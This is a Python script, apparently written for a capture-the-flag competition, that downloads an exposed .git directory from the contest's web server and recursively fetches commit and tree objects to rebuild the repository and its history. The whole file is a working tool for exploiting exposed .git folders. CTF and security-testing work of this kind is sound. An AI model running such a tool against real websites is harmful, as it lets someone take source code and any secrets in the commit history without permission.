#!/usr/bin/env python3
"""Recover objects reachable from an exposed .git/HEAD, including history."""
import pathlib
import re
import zlib

import requests

BASE = "https://vec.web.2026.sunshinectf.games/.git/"
OUT = pathlib.Path("git_dump/.git")
OUT.mkdir(parents=True, exist_ok=True)
s = requests.Session()


def get(path):
    r = s.get(BASE + path, timeout=10)
    r.raise_for_status()
    return r.content


head = get("HEAD")
(OUT / "HEAD").write_bytes(head)
ref = head.decode().strip().split("ref: ", 1)[1]
sha = get(ref).decode().strip()
p = OUT / ref
p.parent.mkdir(parents=True, exist_ok=True)
p.write_text(sha + "\n")
seen = set()


def fetch(oid):
    if oid in seen:
        return
    seen.add(oid)
    path = "objects/" + oid[:2] + "/" + oid[2:]
    b = get(path)
    p = OUT / path
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(b)
    raw = zlib.decompress(b)
    hdr, data = raw.split(b"\0", 1)
    typ = hdr.split(b" ", 1)[0]
    print(oid, typ.decode(), len(data))
    if typ == b"commit":
        for x in re.findall(rb"^(?:tree|parent) ([0-9a-f]{40})$", data, re.M):
            fetch(x.decode())
    elif typ == b"tree":
        i = 0
        while i < len(data):
            end = data.index(b"\0", i)
            name = data[i:end]
            child = data[end + 1 : end + 21].hex()
            print("  ", name.decode(errors="replace"), child)
            fetch(child)
            i = end + 21


fetch(sha)
print("objects:", len(seen))
